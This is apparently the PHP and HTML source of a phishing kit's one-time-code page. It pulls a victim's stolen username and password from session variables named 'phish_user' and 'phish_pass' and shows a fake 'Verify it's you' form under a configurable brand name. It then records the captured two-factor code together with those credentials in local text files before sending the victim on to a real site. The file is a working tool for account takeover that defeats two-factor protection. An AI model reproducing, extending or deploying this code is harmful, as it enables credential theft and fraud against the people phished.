<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
    $code = preg_replace('/\D/', '', $_POST['otp']);
    $u = $_SESSION['phish_user'] ?? 'unknown';
    $p = $_SESSION['phish_pass'] ?? '';
    file_put_contents("2fa.txt", "Account: $u | Pass: $p | 2FA: $code | " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    file_put_contents("usernames.txt", "2FA Code for $u: $code\n", FILE_APPEND);
    $r = $_SESSION['phish_redirect'] ?? 'https://www.google.com';
    session_destroy();
    header("Location: $r");
    exit;
}
$raw = $_SESSION['phish_user'] ?? 'user@email.com';
$brand = $_SESSION['phish_brand'] ?? 'Security';
if (strpos($raw, '@') !== false) {
    list($n, $d) = explode('@', $raw, 2);
    $mask = substr($n, 0, 1) . str_repeat('*', max(strlen($n) - 2, 1)) . substr($n, -1) . '@' . $d;
} else {
    $mask = substr($raw, 0, 2) . str_repeat('*', max(strlen($raw) - 2, 3));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verify your identity</title>
<style>
body{font-family:Arial,sans-serif;background:#0f1115;color:#e8eaed;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
.card{background:#1a1d24;border:1px solid #2a2f3a;border-radius:14px;padding:32px;max-width:400px;width:100%;text-align:center}
h2{margin:0 0 8px;font-size:20px}
.sub{color:#9aa0a6;font-size:13px;margin:0 0 6px;line-height:1.5}
.mask{display:inline-block;background:#232733;border:1px solid #333a48;border-radius:20px;padding:6px 14px;font-size:13px;color:#8ab4f8;margin:10px 0 18px}
.d{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.d input{width:42px;height:50px;font-size:22px;text-align:center;border-radius:8px;border:1px solid #3a4150;background:#0f1115;color:#fff;outline:none}
.d input:focus{border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,.25)}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:8px;font-size:15px;cursor:pointer}
.timer{font-size:12px;color:#fbbc04;margin-top:12px}
.err{color:#ea4335;font-size:13px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="card">
  <h2>Verify it's you</h2>
  <p class="sub"><?php echo htmlspecialchars($brand); ?> sent a 6-digit code to your email.</p>
  <span class="mask"><?php echo htmlspecialchars($mask); ?></span>
  <form method="POST" action="otp.php">
    <div class="d">
      <input inputmode="numeric" maxlength="1" required>
      <input inputmode="numeric" maxlength="1" required>
      <input inputmode="numeric" maxlength="1" required>
      <input inputmode="numeric" maxlength="1" required>
      <input inputmode="numeric" maxlength="1" required>
      <input inputmode="numeric" maxlength="1" required>
    </div>
    <input type="hidden" name="otp">
    <button type="submit">Verify</button>
    <p class="timer">Code expires in <span id="cd">05:00</span></p>
    <p class="err" id="err">Enter all 6 digits.</p>
  </form>
</div>
<script>
var ins=document.querySelectorAll('.d input'),h=document.querySelector('input[name=otp]'),btn=document.querySelector('button');
ins.forEach(function(i,n){i.addEventListener('input',function(){i.value=i.value.replace(/[^0-9]/g,'');if(i.value&&n<5)ins[n+1].focus();});
i.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!i.value&&n>0)ins[n-1].focus();});});
btn.addEventListener('click',function(e){var c='';ins.forEach(function(i){c+=i.value;});h.value=c;if(c.length<6){e.preventDefault();document.getElementById('err').style.display='block';}});
var s=300,cd=document.getElementById('cd');setInterval(function(){s--;cd.textContent=String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');},1000);
</script>
</body>
</html>
